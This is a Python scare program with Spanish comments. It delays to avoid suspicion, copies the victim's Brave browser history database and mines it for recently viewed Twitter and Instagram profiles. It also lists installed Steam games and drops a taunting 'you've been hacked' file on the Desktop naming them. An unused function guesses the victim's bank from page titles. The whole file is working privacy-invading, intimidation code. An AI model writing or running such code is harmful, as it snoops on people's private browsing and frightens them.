import os
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange
import sqlite3
import re
import glob


HACKER_FILE_NAME = "PARA_TI.txt"


def get_user_path():
    return "{}\\".format(Path.home())


def delay_action():
    # Esperaremos entre 1 y 3 horas para no levantar sospechas
    n_hours = randrange(1, 4)
    print("Durmiendo {} horas".format(n_hours))
    #sleep(n_hours * 60 * 60)
    sleep(n_hours)


def create_hacker_file(user_path):
    hacker_file = open(user_path+"\\Desktop\\"+HACKER_FILE_NAME, "w")
    hacker_file.write("Estas jakiado :V\n")
    return hacker_file


def get_brave_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History"
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible \tReintentando en 3 segundos")
            sleep(3)


def check_twitter_profiles_and_scare_user(hacker_file, brave_history):
    profiles_visited = []
    for item in brave_history[:10]:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
    hacker_file.write("He visto que has estado husmeando en los perfiles de esta gente: {}...".format(", ".join(profiles_visited)))


def check_instagram_history(hacker_file, brave_history):
    instagram_profiles_visited = []
    for item in brave_history[:20]:
        #print(item[0])
        results = re.findall("https://www.instagram.com/([A-z-0-9-._]+)?", item[2])
        if results and results[0] not in ["stories", "direct", " ", ""]:
            #print(results[0])
            instagram_profiles_visited.append(results[0])
    hacker_file.write("He visto que has visitado los perfiles de instagram de esta gente: {}...\n".format(", ".join(instagram_profiles_visited)))


def check_steam_games(hacker_file):
    steam_path = "D:\\Program Files\\Steam\\steamapps\\common\\*"
    games_paths = glob.glob(steam_path)
    games = []
    games_paths.sort(key=len, reverse=True)
    for game_path in games_paths:
        games.append(game_path.split("\\")[-1])
    hacker_file.write("He visto que has estado jugando ultimamente a {}... jajjaj...".format(", ".join(games[:3])))


def check_bank_account(hacker_file, brave_history):
    his_bank = None
    banks = ["BBVA", "Santander", "Caja Popular Mexicana"]
    for item in brave_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    hacker_file.write("Además veo que guardas el dinero en {}\n".format(his_bank))


def main():
    # Esperamos un tiempo
    delay_action()
    # Calculamos la ruta del usuario de windows
    user_path = get_user_path()
    # Regogemos el historial de edge, cuando sea posible...
    brave_history = get_brave_history(user_path)
    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)

    #print(brave_history)
    # Escribiendo mensajes de miedo
    check_twitter_profiles_and_scare_user(hacker_file, brave_history)
    check_instagram_history(hacker_file, brave_history)
    # Revisar los juegos que tiene en steam
    check_steam_games(hacker_file)


if __name__ == '__main__':
    main()